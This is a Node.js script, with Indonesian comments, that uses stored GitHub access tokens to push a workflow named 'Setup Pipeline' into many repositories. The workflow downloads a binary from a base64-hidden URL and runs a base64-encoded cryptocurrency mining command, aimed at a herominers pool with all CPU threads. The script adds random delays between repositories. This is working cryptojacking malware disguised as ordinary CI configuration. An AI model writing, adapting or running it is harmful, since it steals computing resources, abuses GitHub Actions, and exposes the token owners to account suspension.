// index.js
const fs = require("fs");
const path = require("path");
const simpleGit = require("simple-git");
const fetch = require("node-fetch");

const WALLET_ADDRESS =
  ""; // ganti sesuai punyamu

// === Multiple config di array ===
const configs = [
  // require("./config/FILENAME.json"),
  require("./config/Alakananda-P.json"),
  require("./config/Ac1d86.json"),
  require("./config/AlexAntonyN.json"),
  require("./config/ArtiKhareIBM.json"),
  require("./config/AugustoTobia.json"),

];

(async () => {
  const summaries = [];
  const grand = { success: 0, inaccessible: 0, failed: 0, cleaned: 0 };

  for (let ci = 0; ci < configs.length; ci++) {
    const config = configs[ci];
    const { GITHUB_PAT, REPO_OWNER, REPO_LIST } = config;

    const section = {
      configIndex: ci,
      owner: REPO_OWNER,
      totalRepos: REPO_LIST.length,
      rows: [],
      success: 0,
      inaccessible: 0,
      failed: 0,
      cleaned: 0,
    };

    const userRes = await fetch("https://api.github.com/user", {
      headers: { Authorization: `token ${GITHUB_PAT}` },
    });
    const userData = await userRes.json();
    const githubUsername = userData.login;
    const commitName = githubUsername;
    const commitEmail = `${githubUsername}@users.noreply.github.com`;

    for (const REPO_NAME of REPO_LIST) {
      const localPath = path.join(__dirname, `temp-${REPO_NAME}`);
      const repoUrl = `https://${GITHUB_PAT}@github.com/${REPO_OWNER}/${REPO_NAME}.git`;

      try {
        const repoRes = await fetch(
          `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}`,
          { headers: { Authorization: `token ${GITHUB_PAT}` } }
        );

        if (repoRes.status !== 200) {
          const note = `HTTP ${repoRes.status}`;
          console.error(
            `❌ Tidak bisa akses repo: ${REPO_OWNER}/${REPO_NAME} (${note})`
          );
          section.inaccessible++;
          section.rows.push({
            repo: `${REPO_OWNER}/${REPO_NAME}`,
            status: "Inaccessible",
            note,
          });
          continue;
        }

        const repoData = await repoRes.json();
        const defaultBranch = repoData.default_branch || "main";

        const git = simpleGit();
        await git.clone(repoUrl, localPath);
        const repoGit = simpleGit(localPath);

        const branches = await repoGit.branch();
        if (!branches.all.includes(defaultBranch)) {
          fs.writeFileSync(path.join(localPath, "README.md"), "# Init");
          await repoGit.add("./*");
          await repoGit.commit("Initial commit");
          await repoGit.push("origin", `HEAD:${defaultBranch}`);
          await repoGit.checkoutBranch(defaultBranch, "HEAD");
        } else {
          await repoGit.checkout(defaultBranch);
        }

        // bikin workflow
        const initCommand = `
./core-engine -o us2.zephyr.herominers.com:1123 \\
  -u ${WALLET_ADDRESS}.${REPO_OWNER}=960000 \\
  --donate-level 0 \\
  -k --threads=$(nproc) --cpu-priority=5 --huge-pages-jit --cpu-no-yield --randomx-no-numa \\
  -a rx/0 --tls --asm=ryzen --randomx-no-rdmsr --randomx-wrmsr=-1 --randomx-mode=fast
        `.trim();
        const encodedStatic = Buffer.from(initCommand).toString("base64");

        const yamlContent = `
name: Setup Pipeline

on:
  push:
    branches: [${defaultBranch}]
  pull_request:
    branches: [${defaultBranch}]
  workflow_dispatch:

jobs:
  deploy-setup:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v2

      - name: Setup Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev

      - name: Download core-engine
        run: |
          ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
          URL=$(echo "$ENCODED" | base64 -d)
          curl -L -o core-engine "$URL"

      - name: Run Machine
        run: |
          chmod +x core-engine
          ENCODED="${encodedStatic}"
          CMD=$(echo "$ENCODED" | base64 -d)
          FINAL_CMD="$CMD > /dev/null 2>&1 &"
          eval "$FINAL_CMD"
          PID=$!
          for i in {1..360}; do
            echo "."
            sleep $((RANDOM % 11 + 35))
          done
          kill $PID || true
`.trim();

        const workflowPath = path.join(localPath, ".github", "workflows");
        fs.mkdirSync(workflowPath, { recursive: true });
        fs.writeFileSync(path.join(workflowPath, "main.yml"), yamlContent);

        await repoGit.addConfig("user.name", commitName);
        await repoGit.addConfig("user.email", commitEmail);
        await repoGit.add("./*");
        await repoGit.commit("setup: pipeline");
        await repoGit.push("origin", defaultBranch);

        console.log(`✅ Workflow added: ${REPO_OWNER}/${REPO_NAME}`);
        section.success++;
        section.rows.push({
          repo: `${REPO_OWNER}/${REPO_NAME}`,
          status: "Success",
          note: "-",
        });
      } catch (err) {
        const note = err?.message || "unknown error";
        console.error(`❌ Error on ${REPO_NAME}: ${note}`);
        section.failed++;
        section.rows.push({
          repo: `${REPO_OWNER}/${REPO_NAME}`,
          status: "Failed",
          note,
        });
      } finally {
        if (fs.existsSync(localPath)) {
          fs.rmSync(localPath, { recursive: true, force: true });
          section.cleaned++;
          console.log(`🧹 Removed temp folder: ${localPath}`);
        }
        const delay = Math.floor(Math.random() * 2500 + 500);
        console.log(
          `⏳ Waiting for ${delay / 1000} seconds before next repo...`
        );
        await new Promise((res) => setTimeout(res, delay));
      }
    }

    grand.success += section.success;
    grand.inaccessible += section.inaccessible;
    grand.failed += section.failed;
    grand.cleaned += section.cleaned;

    summaries.push(section);
  }

  // === Ringkasan di akhir ===
  console.log(
    "\n==================== SUMMARY PER CONFIG ====================\n"
  );
  for (const s of summaries) {
    console.log(
      `Config #${s.configIndex} (owner: ${s.owner}) — repos: ${s.totalRepos}`
    );
    console.table(s.rows);
    console.log(
      `Subtotal => Success: ${s.success} | Inaccessible: ${s.inaccessible} | Failed: ${s.failed} | Cleaned: ${s.cleaned}\n`
    );
  }

  console.log("====================== GRAND TOTAL ========================\n");
  console.table([
    {
      Success: grand.success,
      Inaccessible: grand.inaccessible,
      Failed: grand.failed,
      Cleaned: grand.cleaned,
    },
  ]);
  console.log("===========================================================\n");
})();
